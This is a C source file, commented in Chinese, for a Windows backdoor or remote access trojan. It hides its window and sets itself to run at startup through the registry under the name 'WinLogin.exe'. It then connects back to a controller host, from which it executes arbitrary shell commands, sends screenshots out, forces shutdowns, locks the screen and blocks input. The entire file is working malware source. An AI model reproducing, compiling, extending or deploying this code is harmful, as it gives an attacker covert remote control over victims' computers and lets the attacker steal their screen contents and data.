#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#pragma comment(lib, "ws2_32.lib")
#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

#define MSG_LEN 1024

char ServerAddr[] = "oo.xx.com"; //反弹连接的域名
int ServerPort = 8080;  //连接的端口
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);


// 发送文件
int sendImage(SOCKET client) 
{		
    char sendbuf[1024];
    DWORD        dwRead;  
    BOOL         bRet;  
    char filename[]="screen.png";
	Sleep(100);

    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);  
    while(1) {  //发送文件的buf
        bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
        if(bRet==FALSE) break;
        else if(dwRead==0) {
			Sleep(100);
            break;  
        } else {  
            send(client,sendbuf,dwRead,0);
        }  
    }
	send(client,"EOF",strlen("EOF")+1,0);
    CloseHandle(hFile);
	system("del screen.png");
	
	return 0;
}

// 执行CMD命令，管道传输
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LEN] = {0}; //缓冲区
 
    HANDLE hRead, hWrite;
    STARTUPINFO si;         // 启动配置信息
    PROCESS_INFORMATION pi; // 进程信息
    SECURITY_ATTRIBUTES sa; // 管道安全属性
 
    // 配置管道安全属性
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // 创建匿名管道，管道句柄是可被继承的
    if( !CreatePipe(&hRead, &hWrite, &sa, 1024)) {
        return 1;
    }
 
    // 配置 cmd 启动信息
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // 获取兼容大小
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
    si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
    si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头

	// 拼接 cmd 命令
	sprintf(command, "cmd.exe /c %s", cmdStr);
 
    // 创建子进程,运行命令,子进程是可继承的
    if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        //printf( "Create Process Error: %x\n", (unsigned int)GetLastError());
        CloseHandle( hRead );
        CloseHandle( hWrite );
        return 1;
    }
    CloseHandle( hWrite );
  
    //读取管道的read端,获得cmd输出
    while (ReadFile( hRead, buf, MSG_LEN, &readByte, NULL )) {
        strcat(message, buf);
        ZeroMemory( buf, MSG_LEN );
    }
    CloseHandle( hRead );

    return 0;
}



// 屏幕截屏
int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
{
    HANDLE hDIB;
    HANDLE hFile;
    DWORD dwBmpSize;
    DWORD dwSizeofDIB;
    DWORD dwBytesWritten;
    CHAR FilePath[MAX_PATH];
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    CHAR *lpbitmap;
    INT width = GetSystemMetrics(SM_CXSCREEN);  // 屏幕宽
    INT height = GetSystemMetrics(SM_CYSCREEN);  // 屏幕高
    HDC hdcScreen = GetDC(NULL); // 全屏幕DC
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // 创建兼容内存DC
 
    if (!hdcMemDC) goto done;
 
    // 通过窗口DC 创建一个兼容位图
    hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
 
    if (!hbmScreen) goto done;
 
    // 将位图块传送到兼容内存DC中
    SelectObject(hdcMemDC, hbmScreen);
    if (!BitBlt(
                hdcMemDC,    // 目的DC
                0, 0,        // 目的DC的 x,y 坐标
                width, height, // 目的 DC 的宽高
                hdcScreen,   // 来源DC
                0, 0,        // 来源DC的 x,y 坐标
                SRCCOPY))    // 粘贴方式
        goto done;
  
    // 获取位图信息并存放在 bmpScreen 中
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
 
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
 
    dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    // handle 指向进程默认的堆
    hDIB = GlobalAlloc(GHND, dwBmpSize);
    lpbitmap = (char *)GlobalLock(hDIB);
 
    // 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.
    GetDIBits(
        hdcScreen,  // 设备环境句柄
        hbmScreen,  // 位图句柄
        0,          // 指定检索的第一个扫描线
        (UINT)bmpScreen.bmHeight, // 指定检索的扫描线数
        lpbitmap,   // 指向用来检索位图数据的缓冲区的指针
        (BITMAPINFO *)&bi, // 该结构体保存位图的数据格式
        DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
    );
 
 
    wsprintf(FilePath, "%s\\%s.png", dirPath, filename);
 
    // 创建一个文件来保存文件截图
    hFile = CreateFile(
                FilePath,
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
 
    // 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
    dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
    // 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
 
    // 文件大小
    bmfHeader.bfSize = dwSizeofDIB;
 
    // 位图的 bfType 必须是字符串 "BM"
    bmfHeader.bfType = 0x4D42; //BM
 
    dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
 
    // 解锁堆内存并释放
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
 
    // 关闭文件句柄
    CloseHandle(hFile);
 
    // 清理资源
done:
    DeleteObject(hbmScreen);
    DeleteObject(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
 
    return 0;
}

void c_socket() 
{

	// 初始化 Winsock
	WSADATA wsaData;
	struct hostent *host;
	struct in_addr addr;

	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
	if ( iResult != NO_ERROR )
			//printf("Error at WSAStartup()\n");

	while(1){

		//解析主机地址
		host = gethostbyname(ServerAddr);
		if( host == NULL ) {
			Sleep(20000);
			continue;
		}else{
			addr.s_addr = *(unsigned long * )host->h_addr;
			break;
		}
	}

	// 建立socket socket.
	SOCKET client;
	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( client == INVALID_SOCKET ) {
		printf( "Error at socket(): %ld\n", WSAGetLastError() );
		WSACleanup();
		return;
	}

	// 连接到服务器.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr("192.168.10.233");
	//clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
	clientService.sin_port = htons(ServerPort);
	while(1){
		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
			printf( "\nFailed to connect.\nWait 10s...\n" );
			Sleep(2000);
			continue;
		}else { 
			break;
		}
	}

	//阻塞等待服务端指令
	char recvCmd[MSG_LEN] = {0};
	char message[MSG_LEN] = {0};
	while(1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message,sizeof(message));

		//从服务端获取数据
        recv(client, recvCmd, MSG_LEN, 0);
		if(strlen(recvCmd)<1){  //SOCKET中断重连
			closesocket(client);
			while(1){
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
					printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(2000);
					continue;
				}else break;
			}
			continue;
		}else if(strcmp(recvCmd,"shutdown")==0){  //关机
			system("shutdown -s -t 1");
			continue;
		}else if(strcmp(recvCmd,"reboot")==0){  //重启
			system("shutdown -r -t 10");
			continue;
		}else if(strcmp(recvCmd,"cancel")==0){  //取消关机
			system("shutdown -a");
			continue;
		}else if(strcmp(recvCmd,"kill-client")==0){  //关闭客户端
			send(client,"Client has exit!", 18, 0);
			exit(0);
		}else if(strcmp(recvCmd,"screenshot")==0){  //截屏
			CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.png
			sendImage(client);
			continue;
		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
			int i;
			char c;
			char CMD[30]={0};
			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
				CMD[i-1] = recvCmd[i];
			}
			if(recvCmd[0] == '$') {  //执行任意指令
				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
				else send(client,"CMD Error!\n",13,0);
			}else {  //弹窗
				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
			}
			continue;
		}else if(strcmp(recvCmd,"lock")==0){ //锁屏
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}else if(strcmp(recvCmd,"blockinput")==0){ //冻结鼠标和键盘
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //重置光标
			SetCursorPos(0,0);
			continue;
		}else{
			continue;
		}
	}
	WSACleanup();
    return;
}


int autoRun()
{
    HKEY hKey;
    DWORD result;
    char path[] = "C:\\Users\\WinLogin.exe"; // 要开机启动的程序
 
    //打开注册表
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
        0,              // 保留参数必须填 0
        KEY_SET_VALUE,  // 打开权限，写入
        &hKey           // 打开之后的句柄
    );

    if (result != ERROR_SUCCESS) return 0;

    // 在注册表中设置(没有则会新增一个值)
    result = RegSetValueEx(
                 hKey,
                 "Registry Example", // 键名
                 0,                  // 保留参数必须填 0
                 REG_SZ,             // 键值类型为字符串
                 (const unsigned char *)path, // 字符串首地址
                 sizeof(path)        // 字符串长度
             );

    if (result != ERROR_SUCCESS) return 0;
 
    //关闭注册表:
    RegCloseKey(hKey);
    return 0;
}

int main()
{
	autoRun();
	c_socket();

	return 0;
}
